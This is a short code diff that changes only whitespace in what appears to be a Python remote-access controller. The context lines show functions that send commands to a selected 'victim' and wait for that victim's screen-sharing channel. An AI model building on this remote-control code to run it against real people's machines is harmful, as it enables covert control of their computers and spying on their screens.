@@ -146,7 +146,7 @@ def processCommand(command, selectedVictim):
     param 1 type: str
     param 2 type: str
     """
-
+    
     print(f"command: {command}, victim: {selectedVictim}")
 
     print("Sending command!")
@@ -173,7 +173,7 @@ def handleScreenSharing(selectedVictim):
     param 1: the socket object of the victim to apply the command on 
     param 1 type: socket.socket
     """
-
+    
     while SCREEN_SHARE_CHANNEL not in victims[selectedVictim].keys():
         print("Waiting for the screen sharing channel to connect")
         sleep(1)
